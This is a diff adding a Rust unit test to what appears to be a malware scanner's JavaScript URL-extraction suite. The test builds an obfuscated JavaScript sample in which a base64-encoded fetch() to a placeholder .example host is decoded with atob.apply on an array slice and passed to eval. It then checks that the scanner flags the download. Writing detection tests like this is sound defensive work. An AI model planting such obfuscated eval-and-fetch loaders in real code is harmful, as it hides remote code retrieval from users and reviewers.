@@ -10079,6 +10079,31 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_atob_apply_array_slice_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-apply-array-slice-js.example/p')",
+        );
+        let js = format!(
+            r#"var a = ["noise", "{encoded}", "noise"]; eval(atob.apply(null, a.slice(1, 2)))"#
+        )
+        .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-apply-array-slice-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob.apply array slice payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_atob_apply_bound_array_variable_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let encoded = base64::Engine::encode(
